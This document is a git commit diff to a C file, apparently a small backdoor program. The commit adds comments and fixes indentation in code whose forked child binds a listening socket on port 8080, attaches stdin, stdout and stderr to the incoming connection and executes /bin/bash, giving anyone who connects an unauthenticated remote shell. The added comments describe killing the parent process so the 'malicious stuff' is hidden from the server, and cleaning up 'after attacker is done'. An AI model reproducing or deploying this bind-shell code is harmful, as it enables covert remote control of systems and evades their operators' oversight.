a06d309b370b75afb0fc0f3e745fc66bc6c99810
Fanda Burkon <fanda.burkon@seznam.cz>
2022-06-04 08:33:02 +0200

    fixed weird formatting and added comments

--- main.c
+++ main.c
@@ -14,30 +14,40 @@ int main() {
 
     if (pid == 0) {
 
+        // init socket
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in serveraddr;
 
+        // config address and port
         serveraddr.sin_family = AF_INET;
         serveraddr.sin_port = htons(8080);
         serveraddr.sin_addr.s_addr = INADDR_ANY;
 
+        // bind socket
         bind(sock, (struct sockaddr*)&serveraddr, sizeof(serveraddr));
 
+        // listen
         listen(sock, 5);
 
+        // accept
         int client_sock = accept(sock, NULL, NULL);
 
-	dup2(client_sock, 0);
-	dup2(client_sock, 1);
-	dup2(client_sock, 2);
+        // duplicate stdin, stdout and stderr to connected socket
+        dup2(client_sock, 0);
+        dup2(client_sock, 1);
+        dup2(client_sock, 2);
 
-	char* const args[] = {"/bin/bash", NULL};
+        // define arguments
+        char* const args[] = {"/bin/bash", NULL};
 
-	kill(getppid(), 9);
+        // kill parent process so the malicious stuff is not happening in front of server's eyes
+        kill(getppid(), 9);
 
-	execvp("/bin/bash", args);
-	    
-	kill(getpid(), 9);
+        // execute bash
+        execvp("/bin/bash", args);
+        
+        // after attacker is done, kill this process
+        kill(getpid(), 9);
 
     } else wait(0);
 
